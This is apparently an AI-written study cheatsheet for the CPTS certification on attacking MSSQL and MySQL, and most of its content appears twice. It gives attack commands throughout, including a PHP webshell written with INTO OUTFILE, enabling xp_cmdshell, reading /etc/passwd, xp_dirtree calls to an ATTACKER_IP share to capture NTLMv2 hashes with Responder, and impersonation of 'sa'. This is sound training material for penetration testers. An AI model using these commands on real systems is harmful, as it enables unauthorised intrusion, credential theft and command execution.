# Attacking SQL Databases — CPTS Cheatsheet

## 1. Quick Reference

| Service       | Default Port | Notes                   |
| ------------- | -----------: | ----------------------- |
| MSSQL         |   `TCP/1433` | Microsoft SQL Server    |
| MSSQL Browser |   `UDP/1434` | SQL Server discovery    |
| MSSQL hidden  |   `TCP/2433` | Possible alternate port |
| MySQL         |   `TCP/3306` | MySQL/MariaDB           |

**Main goals after gaining DB access:**

1. Enumerate databases
2. Enumerate tables
3. Find interesting data/credentials
4. Determine privileges
5. Check command execution
6. Check file read/write
7. Check MSSQL impersonation
8. Check linked servers
9. Consider NTLM hash capture

---

# 2. Enumeration

### MSSQL

```bash
nmap -Pn -sV -sC -p1433 <TARGET>
```

Look for:

* SQL Server version
* Hostname
* Domain
* SQL instance information
* NTLM information
* TLS/SSL information

### Broader SQL port scan

```bash
nmap -Pn -sV -p1433,2433,3306 <TARGET>
```

---

# 3. MSSQL Authentication

### SQL Authentication

Username/password stored inside SQL Server.

```text
username + password
```

### Windows Authentication

Uses Windows/Active Directory credentials.

```text
DOMAIN\username
SERVER\username
.\username
```

**Key distinction:**

```text
SQL Authentication  → SQL Server account
Windows Auth        → Windows/AD account
```

---

# 4. Connect to MySQL

```bash
mysql -u <USER> -p<PASSWORD> -h <TARGET>
```

Example:

```bash
mysql -u julio -pPassword123 -h 10.129.20.13
```

**Tip:** `-p` directly followed by the password works, but interactive password entry is generally safer.

---

# 5. Connect to MSSQL

### Windows / SQLCMD

```cmd
sqlcmd -S <SERVER> -U <USER> -P '<PASSWORD>'
```

Better output:

```cmd
sqlcmd -S <SERVER> -U <USER> -P '<PASSWORD>' -y 30 -Y 30
```

### Linux — sqsh

```bash
sqsh -S <TARGET> -U <USER> -P '<PASSWORD>' -h
```

Windows/local account:

```bash
sqsh -S <TARGET> -U .\\<USER> -P '<PASSWORD>' -h
```

### Impacket

```bash
impacket-mssqlclient -p 1433 <USER>@<TARGET>
```

Then enter the password.

---

# 6. MySQL Database Enumeration

### Show databases

```sql
SHOW DATABASES;
```

### Select database

```sql
USE <DATABASE>;
```

### Show tables

```sql
SHOW TABLES;
```

### Read table

```sql
SELECT * FROM <TABLE>;
```

### Useful workflow

```text
SHOW DATABASES
      ↓
USE database
      ↓
SHOW TABLES
      ↓
SELECT * FROM interesting_table
```

---

# 7. MSSQL Database Enumeration

### Show databases

```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

### Select database

```sql
USE <DATABASE>
GO
```

### Show tables

```sql
SELECT table_name
FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
GO
```

### Read table

```sql
SELECT * FROM <TABLE>
GO
```

**Important:** `sqlcmd` requires:

```text
GO
```

to execute the submitted SQL batch.

---

# 8. Important Default Databases

### MySQL

```text
mysql
information_schema
performance_schema
sys
```

### MSSQL

```text
master
msdb
model
resource
tempdb
```

**Most useful for enumeration:**

```text
MySQL      → information_schema
MSSQL      → master
```

---

# 9. MSSQL — Check Current User / Privileges

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Result:

```text
0 = not sysadmin
1 = sysadmin
```

This should be one of the **first privilege checks** after connecting.

---

# 10. MSSQL — xp_cmdshell

`xp_cmdshell` executes operating-system commands through SQL Server.

### Check / execute

```sql
EXEC xp_cmdshell 'whoami'
GO
```

The command runs with the privileges of the **SQL Server service account**.

### Enable xp_cmdshell

Only if you have sufficient privileges:

```sql
EXECUTE sp_configure 'show advanced options', 1
GO

RECONFIGURE
GO

EXECUTE sp_configure 'xp_cmdshell', 1
GO

RECONFIGURE
GO
```

Then:

```sql
EXEC xp_cmdshell 'whoami'
GO
```

### Key idea

```text
SQL privileges
      ↓
xp_cmdshell
      ↓
Windows command execution
      ↓
SQL Server service account privileges
```

---

# 11. MySQL — Write Local Files

MySQL can write files using:

```sql
SELECT ... INTO OUTFILE
```

Example:

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>"
INTO OUTFILE '/var/www/html/webshell.php';
```

This requires appropriate privileges, especially:

```text
FILE
```

### Check secure_file_priv

```sql
SHOW VARIABLES LIKE "secure_file_priv";
```

Interpretation:

```text
empty   → no directory restriction
/path   → file operations restricted to that directory
NULL    → file import/export disabled
```

**Important attack condition:**

```text
FILE privilege
+
permitted output directory
+
web-accessible location
```

can potentially turn database access into web-server command execution.

---

# 12. MSSQL — Read Local Files

MSSQL can read files accessible to the SQL Server account.

```sql
SELECT *
FROM OPENROWSET(
    BULK N'C:/Windows/System32/drivers/etc/hosts',
    SINGLE_CLOB
) AS Contents
GO
```

Concept:

```text
SQL Server
    ↓
OPENROWSET(BULK ...)
    ↓
OS file
    ↓
file contents
```

---

# 13. MySQL — Read Local Files

Use:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Example:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Requires appropriate configuration/privileges.

---

# 14. MSSQL — Capture Service Account NTLMv2 Hash

A very important attack chain:

```text
xp_dirtree / xp_subdirs
        ↓
SMB connection
        ↓
MSSQL service account authenticates
        ↓
NTLMv2 challenge/response captured
        ↓
Crack or relay
```

### Using xp_dirtree

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO
```

### Using xp_subdirs

```sql
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
GO
```

### Listener — Responder

```bash
sudo responder -I <INTERFACE>
```

Captured hashes appear in:

```text
Responder logs
```

### Alternative — Impacket SMB server

```bash
sudo impacket-smbserver share ./ -smb2support
```

Then trigger:

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO
```

### What you receive

Usually an:

```text
NTLMv2 / NetNTLMv2
```

challenge-response hash.

Possible next steps:

```text
Captured hash
   ├── Crack
   └── Relay
```

---

# 15. MSSQL — Impersonation

SQL Server has an:

```text
IMPERSONATE
```

permission.

It can allow one SQL login to operate as another login.

### Find impersonatable users

```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

### Check current privileges

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

### Impersonate

```sql
EXECUTE AS LOGIN = 'sa'
GO
```

Then verify:

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

### Revert

```sql
REVERT
GO
```

### Important

If necessary, first switch to:

```sql
USE master
GO
```

**Attack chain:**

```text
Low-privileged SQL user
        ↓
IMPERSONATE permission
        ↓
Impersonate privileged login
        ↓
sysadmin
        ↓
Full SQL Server control
```

---

# 16. MSSQL — Linked Servers

A linked server allows one SQL Server to communicate with another SQL Server/database system.

### Enumerate linked servers

```sql
SELECT srvname, isremote
FROM sysservers
GO
```

Look for:

```text
remote SQL servers
linked SQL instances
```

### Execute query on linked server

```sql
EXECUTE(
'SELECT @@servername,
        @@version,
        system_user,
        is_srvrolemember(''sysadmin'')'
) AT [<LINKED_SERVER>]
GO
```

**Important:** Quotes inside the remote query need escaping.

### Attack chain

```text
Current SQL Server
       ↓
Linked Server
       ↓
Remote SQL Server
       ↓
Different credentials/privileges
       ↓
Possible lateral movement
```

If the linked-server account is `sysadmin`, the remote SQL instance may provide command execution through `xp_cmdshell`.

---

# 17. MySQL Authentication Vulnerability — CVE-2012-2122

Historical vulnerability affecting certain MySQL versions.

Concept:

```text
Repeated incorrect authentication attempts
              ↓
Authentication comparison bug
              ↓
Potential authentication bypass
```

**Remember:** this is a **version-specific historical vulnerability**, not a generic MySQL authentication technique.

---

# 18. Latest SQL Vulnerability — xp_dirtree

This is important because it is **not a traditional CVE-based vulnerability**.

The weakness comes from the interaction between:

```text
MSSQL
+
xp_dirtree
+
SMB authentication
```

### Flow

```text
Attacker-controlled UNC path
          ↓
xp_dirtree()
          ↓
MSSQL attempts SMB access
          ↓
Windows automatically authenticates
          ↓
NTLMv2 response sent
          ↓
Attacker captures it
          ↓
Crack / Relay
```

Example:

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO
```

The critical concept is **forced authentication**, not code execution.

---

# 19. High-Value MSSQL Checks

After obtaining MSSQL credentials, think in this order:

```text
1. Who am I?
   ↓
SELECT SYSTEM_USER

2. Am I sysadmin?
   ↓
IS_SRVROLEMEMBER('sysadmin')

3. What databases exist?
   ↓
master.dbo.sysdatabases

4. What tables/data exist?
   ↓
INFORMATION_SCHEMA

5. Can I execute commands?
   ↓
xp_cmdshell

6. Can I impersonate someone?
   ↓
IMPERSONATE

7. Are there linked servers?
   ↓
sysservers

8. Can the server authenticate to me?
   ↓
xp_dirtree / xp_subdirs
```

---

# 20. MySQL High-Value Checks

```text
1. Connect
   ↓
mysql

2. Databases
   ↓
SHOW DATABASES

3. Select interesting DB
   ↓
USE <DB>

4. Tables
   ↓
SHOW TABLES

5. Interesting data
   ↓
SELECT * FROM <TABLE>

6. File privileges
   ↓
secure_file_priv

7. File read
   ↓
LOAD_FILE()

8. File write
   ↓
SELECT ... INTO OUTFILE
```

---

# 21. CPTS SQL Attack Workflow

```text
                    SQL SERVICE
                         │
             ┌───────────┴───────────┐
             ↓                       ↓
           MSSQL                    MySQL
             │                       │
       Enumerate version       Enumerate version
             │                       │
       Authenticate            Authenticate
             │                       │
       Enumerate DBs           Enumerate DBs
             │                       │
       Enumerate tables        Enumerate tables
             │                       │
       Find sensitive data     Find sensitive data
             │                       │
      Check privileges         Check privileges
             │                       │
      ┌──────┼────────┐         ┌────┴─────┐
      ↓      ↓        ↓         ↓          ↓
  xp_cmdshell  Impersonate  Linked     LOAD_FILE
      │                    Servers          │
      ↓                                      ↓
 OS Command Execution                   File Read
      │
      └──────────────┐
                     ↓
              xp_dirtree
                     ↓
              SMB Authentication
                     ↓
                NTLMv2 Hash
                 ↙       ↘
              Crack      Relay
```

---

# 22. Must-Remember Commands

### Enumeration

```bash
nmap -Pn -sV -sC -p1433 <TARGET>
```

### MySQL

```bash
mysql -u <USER> -p<PASSWORD> -h <TARGET>
```

```sql
SHOW DATABASES;
USE <DB>;
SHOW TABLES;
SELECT * FROM <TABLE>;
```

### MSSQL

```bash
impacket-mssqlclient -p 1433 <USER>@<TARGET>
```

```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

### Command execution

```sql
EXEC xp_cmdshell 'whoami'
GO
```

### File read

```sql
SELECT * FROM OPENROWSET(
BULK N'C:/path/file',
SINGLE_CLOB
) AS Contents
GO
```

```sql
SELECT LOAD_FILE('/etc/passwd');
```

### Forced authentication

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO
```

```bash
sudo responder -I <INTERFACE>
```

### Impersonation

```sql
EXECUTE AS LOGIN = 'sa'
GO

REVERT
GO
```

### Linked server

```sql
SELECT srvname, isremote
FROM sysservers
GO
```

---

# 23. Core Things to Remember

* **1433 = MSSQL**, **3306 = MySQL**.
* `GO` is important when using `sqlcmd`.
* Always check **who you are and your privileges** after connecting.
* MSSQL's `xp_cmdshell` can turn SQL access into OS command execution.
* MySQL `LOAD_FILE()` can provide local file reads when configuration/privileges allow it.
* MySQL `SELECT ... INTO OUTFILE` can write files when `FILE` and filesystem conditions permit it.
* `xp_dirtree` / `xp_subdirs` can force MSSQL's service account to authenticate over SMB.
* Captured NTLMv2 can potentially be **cracked or relayed**.
* `IMPERSONATE` can lead to privilege escalation inside MSSQL.
* **Linked servers** can provide a path to another SQL instance.
* Database access does **not automatically mean sysadmin/root** — privileges determine what you can actually do.
* The main pentesting mindset is:

```text
Access → Enumerate → Privileges → Data → Execution → Lateral Movement
```

# Attacking SQL Databases — CPTS Cheatsheet

## 1. Quick Reference

| Service       | Default Port | Notes                   |
| ------------- | -----------: | ----------------------- |
| MSSQL         |   `TCP/1433` | Microsoft SQL Server    |
| MSSQL Browser |   `UDP/1434` | SQL Server discovery    |
| MSSQL hidden  |   `TCP/2433` | Possible alternate port |
| MySQL         |   `TCP/3306` | MySQL/MariaDB           |

**Main goals after gaining DB access:**

1. Enumerate databases
2. Enumerate tables
3. Find interesting data/credentials
4. Determine privileges
5. Check command execution
6. Check file read/write
7. Check MSSQL impersonation
8. Check linked servers
9. Consider NTLM hash capture

---

## 2. Enumeration

### MSSQL

```bash
nmap -Pn -sV -sC -p1433 <TARGET>
```

Look for:

* SQL Server version
* Hostname
* Domain
* SQL instance information
* NTLM information
* TLS/SSL information

### Broader SQL port scan

```bash
nmap -Pn -sV -p1433,2433,3306 <TARGET>
```

---

## 3. MSSQL Authentication

### SQL Authentication

Username/password stored inside SQL Server.

```text
username + password
```

### Windows Authentication

Uses Windows/Active Directory credentials.

```text
DOMAIN\username
SERVER\username
.\username
```

**Key distinction:**

```text
SQL Authentication  → SQL Server account
Windows Auth        → Windows/AD account
```

---

## 4. Connect to MySQL

```bash
mysql -u <USER> -p<PASSWORD> -h <TARGET>
```

---

## 5. Connect to MSSQL

### SQLCMD

```cmd
sqlcmd -S <SERVER> -U <USER> -P '<PASSWORD>'
```

Better output:

```cmd
sqlcmd -S <SERVER> -U <USER> -P '<PASSWORD>' -y 30 -Y 30
```

### Linux — sqsh

```bash
sqsh -S <TARGET> -U <USER> -P '<PASSWORD>' -h
```

### Impacket

```bash
impacket-mssqlclient -p 1433 <USER>@<TARGET>
```

---

## 6. MySQL Enumeration

```sql
SHOW DATABASES;
```

```sql
USE <DATABASE>;
```

```sql
SHOW TABLES;
```

```sql
SELECT * FROM <TABLE>;
```

Workflow:

```text
SHOW DATABASES
      ↓
USE database
      ↓
SHOW TABLES
      ↓
SELECT * FROM interesting_table
```

---

## 7. MSSQL Enumeration

### Databases

```sql
SELECT name FROM master.dbo.sysdatabases
GO
```

### Select database

```sql
USE <DATABASE>
GO
```

### Tables

```sql
SELECT table_name
FROM <DATABASE>.INFORMATION_SCHEMA.TABLES
GO
```

### Read table

```sql
SELECT * FROM <TABLE>
GO
```

**Remember:** `sqlcmd` uses `GO` to execute the SQL batch.

---

## 8. Default Databases

### MySQL

```text
mysql
information_schema
performance_schema
sys
```

### MSSQL

```text
master
msdb
model
resource
tempdb
```

---

## 9. Check MSSQL Privileges

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

```text
0 = not sysadmin
1 = sysadmin
```

---

## 10. MSSQL — xp_cmdshell

Execute OS commands:

```sql
EXEC xp_cmdshell 'whoami'
GO
```

If disabled, and you have sufficient privileges:

```sql
EXECUTE sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXECUTE sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
```

**Key concept:**

```text
SQL privileges
      ↓
xp_cmdshell
      ↓
Windows command execution
      ↓
SQL Server service-account privileges
```

---

## 11. MySQL — File Write

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>"
INTO OUTFILE '/var/www/html/webshell.php';
```

Requires appropriate privileges, particularly:

```text
FILE
```

Check:

```sql
SHOW VARIABLES LIKE "secure_file_priv";
```

Interpretation:

```text
empty   → no directory restriction
/path   → restricted to that directory
NULL    → import/export disabled
```

---

## 12. MSSQL — Read Local Files

```sql
SELECT *
FROM OPENROWSET(
    BULK N'C:/Windows/System32/drivers/etc/hosts',
    SINGLE_CLOB
) AS Contents
GO
```

Requires the SQL Server account to have appropriate filesystem access.

---

## 13. MySQL — Read Local Files

```sql
SELECT LOAD_FILE('/etc/passwd');
```

Requires appropriate configuration and privileges.

---

## 14. MSSQL — Capture NTLMv2

### Attack chain

```text
xp_dirtree / xp_subdirs
        ↓
SMB connection
        ↓
MSSQL service account authenticates
        ↓
NTLMv2 captured
        ↓
Crack or relay
```

### xp_dirtree

```sql
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share\'
GO
```

### xp_subdirs

```sql
EXEC master..xp_subdirs '\\<ATTACKER_IP>\share\'
GO
```

### Responder

```bash
sudo responder -I <INTERFACE>
```

### Impacket SMB server

```bash
sudo impacket-smbserver share ./ -smb2support
```

**Important:** this is forced SMB authentication, not direct code execution.

---

## 15. MSSQL — Impersonation

Find impersonatable users:

```sql
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
GO
```

Check current privileges:

```sql
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
GO
```

Impersonate:

```sql
EXECUTE AS LOGIN = 'sa'
GO
```

Revert:

```sql
REVERT
GO
```

Attack chain:

```text
Low-privileged SQL user
        ↓
IMPERSONATE permission
        ↓
Privileged login
        ↓
sysadmin
```

---

## 16. MSSQL — Linked Servers

Enumerate:

```sql
SELECT srvname, isremote
FROM sysservers
GO
```

Query linked server:

```sql
EXECUTE(
'SELECT @@servername,
        @@version,
        system_user,
        is_srvrolemember(''sysadmin'')'
) AT [<LINKED_SERVER>]
GO
```

Attack chain:

```text
Current SQL Server
       ↓
Linked Server
       ↓
Remote SQL Server
       ↓
Potentially different privileges
       ↓
Lateral movement
```

---

## 17. CVE-2012-2122 — MySQL

Historical, version-specific MySQL authentication bypass.

Concept:

```text
Repeated authentication attempts
          ↓
Comparison bug
          ↓
Potential authentication bypass
```

**Do not treat this as a general MySQL technique. Check the affected version first.**

---

## 18. xp_dirtree Forced Authentication

`xp_dirtree` itself is not a traditional CVE.

The attack abuses:

```text
MSSQL
+
xp_dirtree
+
SMB authentication
```

Flow:

```text
Attacker-controlled UNC path
          ↓
xp_dirtree()
          ↓
MSSQL attempts SMB access
          ↓
Windows authenticates
          ↓
NTLMv2 response sent
          ↓
Capture
       ↙     ↘
    Crack    Relay
```

---

## 19. MSSQL High-Value Checklist

```text
[ ] Version / hostname
[ ] SQL authentication or Windows authentication
[ ] Current user
[ ] sysadmin?
[ ] Databases
[ ] Tables
[ ] Interesting credentials/data
[ ] xp_cmdshell
[ ] File read
[ ] IMPERSONATE
[ ] Linked servers
[ ] xp_dirtree / xp_subdirs
[ ] NTLMv2 capture
```

---

## 20. MySQL High-Value Checklist

```text
[ ] Version
[ ] Authentication
[ ] Databases
[ ] Tables
[ ] Interesting data
[ ] FILE privilege
[ ] secure_file_priv
[ ] LOAD_FILE()
[ ] SELECT INTO OUTFILE
```

---

## 21. Core Mental Model

```text
ACCESS
  ↓
ENUMERATION
  ↓
PRIVILEGES
  ↓
INTERESTING DATA
  ↓
FILE READ/WRITE
  ↓
COMMAND EXECUTION
  ↓
IMPERSONATION / LINKED SERVERS
  ↓
LATERAL MOVEMENT
  ↓
NTLM CAPTURE / CRACK / RELAY
```

### The most important things to remember

* `1433` → MSSQL
* `3306` → MySQL
* `GO` → execute SQLCMD batch
* `xp_cmdshell` → MSSQL → OS commands
* `LOAD_FILE()` → MySQL → file read
* `SELECT ... INTO OUTFILE` → MySQL → file write
* `xp_dirtree` / `xp_subdirs` → MSSQL → forced SMB authentication
* `IMPERSONATE` → possible MSSQL privilege escalation
* `sysservers` → linked-server enumeration
* NTLMv2 captured from MSSQL → potentially **crack or relay**
* **Always enumerate privileges before assuming what database access gives you.**

This one is a bit longer than the FTP/SMB sheets because SQL has **two database technologies plus several distinct attack paths**, but I’ve kept the actual command reference tight.
